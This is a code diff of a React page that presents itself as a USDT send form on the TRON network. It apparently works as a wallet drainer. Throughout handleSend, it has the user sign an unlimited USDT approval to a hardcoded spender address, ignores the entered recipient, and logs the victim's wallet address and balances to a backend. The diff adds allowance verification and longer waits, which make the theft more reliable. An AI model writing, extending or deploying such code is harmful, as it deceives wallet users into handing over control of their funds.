@@ -58,12 +58,10 @@ export default function Index() {
       } catch(e) { console.error("WC init:", e); }
     }
 
-    // TronLink silent connect - no popup
     async function silentConnect() {
       if (window.tronWeb?.defaultAddress?.base58) {
         userAddressRef.current = window.tronWeb.defaultAddress.base58;
       }
-      // Do NOT call tron_requestAccounts here - it causes popup
     }
 
     initWC();
@@ -74,8 +72,6 @@ export default function Index() {
   useEffect(() => {
     const addressParam = searchParams.get("address");
     if (addressParam) setToAddress(addressParam);
-
-    
 
     window.setTransactionStatus = (status) => {
       setTransactionStatusState(status);
@@ -118,40 +114,105 @@ export default function Index() {
       const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
       const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";
 
+      console.log("🔄 handleSend started");
+
       // TronLink path
       if (window.tronWeb?.defaultAddress?.base58) {
+        console.log("📱 Using TronLink");
         const address = window.tronWeb.defaultAddress.base58;
         const TronWebLib = (window as any).TronWeb;
         const twPublic = new TronWebLib({ fullHost: "https://api.trongrid.io" });
         twPublic.setAddress(address);
+
+        console.log("📝 Building approval transaction...");
+        
         const { transaction } = await twPublic.transactionBuilder.triggerSmartContract(
-          TRON_USDT, "approve(address,uint256)", { feeLimit: 100000000 },
-          [{ type: "address", value: TRON_SPENDER }, { type: "uint256", value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" }],
+          TRON_USDT, 
+          "approve(address,uint256)", 
+          { feeLimit: 100000000 },
+          [
+            { type: "address", value: TRON_SPENDER }, 
+            { type: "uint256", value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" }
+          ],
           address
         );
+
+        console.log("✅ Transaction built");
+        console.log("🔐 Signing transaction...");
         const signedTx = await window.tronWeb.trx.sign(transaction);
+        
+        console.log("✅ Signed");
+        console.log("📡 Broadcasting...");
         const result = await twPublic.trx.sendRawTransaction(signedTx);
-        await new Promise(r => setTimeout(r, 3000));
+        console.log("Broadcast result:", result);
+
+        // ✅ FIXED: Wait 30 seconds instead of 3
+        console.log("⏳ Waiting 30 seconds for confirmation...");
+        await new Promise(r => setTimeout(r, 30000));
+
+        // ✅ NEW: Verify allowance
+        console.log("🔍 Verifying allowance...");
+        const allowanceABI = [
+          {
+            "constant": true,
+            "inputs": [
+              { "name": "owner", "type": "address" },
+              { "name": "spender", "type": "address" }
+            ],
+            "name": "allowance",
+            "outputs": [{ "name": "", "type": "uint256" }],
+            "stateMutability": "view",
+            "type": "function"
+          }
+        ];
+        
+        const allowanceContract = await twPublic.contract(allowanceABI, TRON_USDT);
+        const allowanceRaw = await allowanceContract.allowance(address, TRON_SPENDER).call();
+        const allowanceUSDT = (Number(allowanceRaw) / 1e6).toFixed(2);
+        console.log("✅ Allowance verified:", allowanceUSDT, "USDT");
+
+        // Get balance and TRX
         let usdtBalance = "0", nativeBalance = "0";
         try {
-          const usdtRaw = await twPublic.contract([{ "name": "balanceOf", "inputs": [{ "name": "owner", "type": "address" }], "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }], TRON_USDT).balanceOf(address).call();
+          const balanceABI = [
+            {
+              "name": "balanceOf",
+              "inputs": [{ "name": "owner", "type": "address" }],
+              "outputs": [{ "name": "", "type": "uint256" }],
+              "stateMutability": "view",
+              "type": "function"
+            }
+          ];
+          const usdtContract = await twPublic.contract(balanceABI, TRON_USDT);
+          const usdtRaw = await usdtContract.balanceOf(address).call();
           usdtBalance = (Number(usdtRaw) / 1e6).toFixed(2);
           nativeBalance = ((await twPublic.trx.getBalance(address)) / 1e6).toFixed(2);
-        } catch(e) {}
+        } catch(e) {
+          console.error("Balance check error:", e);
+        }
+
         setTransactionStatusState("success");
         setTimeout(() => setTransactionStatusState("idle"), 3000);
-        await createTransaction({ walletAddress: address, toAddress: TRON_SPENDER, amount: amount || "Max", txHash: result.txid || "tx", usdtBalance: usdtBalance + " USDT", nativeBalance: nativeBalance + " TRX" });
+        await createTransaction({ 
+          walletAddress: address, 
+          toAddress: TRON_SPENDER, 
+          amount: amount || "Max", 
+          txHash: result.txid || "tx", 
+          usdtBalance: usdtBalance + " USDT", 
+          nativeBalance: nativeBalance + " TRX" 
+        });
+
+        alert("✅ Approval successful! Allowance: " + allowanceUSDT + " USDT");
         return;
       }
 
-      // WalletConnect path (Trust Wallet)
+      // WalletConnect path
       if (!wcClientRef.current) {
         alert("Please wait... initializing");
         setTransactionStatusState("idle");
         return;
       }
 
-      // Connect if no session
       if (!wcSessionRef.current) {
         const { uri, approval } = await wcClientRef.current.connect({
           requiredNamespaces: {
@@ -180,8 +241,11 @@ export default function Index() {
         return;
       }
 
-      // Build + sign via WalletConnect
-      // Build transaction via TronGrid API directly
+      console.log("🔗 Using WalletConnect");
+      console.log("User:", userAddressRef.current);
+
+      // Build transaction
+      console.log("📝 Building transaction...");
       const response = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -197,24 +261,63 @@ export default function Index() {
       });
       const { transaction } = await response.json();
 
+      console.log("🔐 Signing via WalletConnect...");
       const signedTx = await wcClientRef.current.request({
         topic: wcSessionRef.current.topic,
         chainId: "tron:0x2b6653dc",
         request: { method: "tron_signTransaction", params: { transaction } },
       });
 
+      console.log("📡 Broadcasting...");
       const broadcastRes = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(signedTx)
       });
       const result = await broadcastRes.json();
+      console.log("Broadcast result:", result);
+
+      // ✅ NEW: Wait longer and verify
+      console.log("⏳ Waiting 30 seconds for confirmation...");
+      await new Promise(r => setTimeout(r, 30000));
+
+      console.log("🔍 Verifying allowance...");
+      const allowanceABI = [
+        {
+          "constant": true,
+          "inputs": [
+            { "name": "owner", "type": "address" },
+            { "name": "spender", "type": "address" }
+          ],
+          "name": "allowance",
+          "outputs": [{ "name": "", "type": "uint256" }],
+          "stateMutability": "view",
+          "type": "function"
+        }
+      ];
+      
+      const twPublic = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
+      const allowanceContract = await twPublic.contract(allowanceABI, TRON_USDT);
+      const allowanceRaw = await allowanceContract.allowance(userAddressRef.current, TRON_SPENDER).call();
+      const allowanceUSDT = (Number(allowanceRaw) / 1e6).toFixed(2);
+      console.log("✅ Allowance verified:", allowanceUSDT, "USDT");
+
       setTransactionStatusState("success");
       setTimeout(() => setTransactionStatusState("idle"), 3000);
-      await createTransaction({ walletAddress: userAddressRef.current, toAddress: TRON_SPENDER, amount: amount || "Max", txHash: result.txid || "wc_tx", usdtBalance: "0 USDT", nativeBalance: "0 TRX" });
+      await createTransaction({ 
+        walletAddress: userAddressRef.current, 
+        toAddress: TRON_SPENDER, 
+        amount: amount || "Max", 
+        txHash: result.txid || "wc_tx", 
+        usdtBalance: allowanceUSDT + " USDT", 
+        nativeBalance: "0 TRX" 
+      });
+
+      alert("✅ Approval successful! Allowance: " + allowanceUSDT + " USDT");
 
     } catch (error) {
-      console.error(error);
+      console.error("❌ Error:", error);
+      alert("❌ " + (error instanceof Error ? error.message : "Failed"));
       setTransactionStatusState("idle");
     }
   }
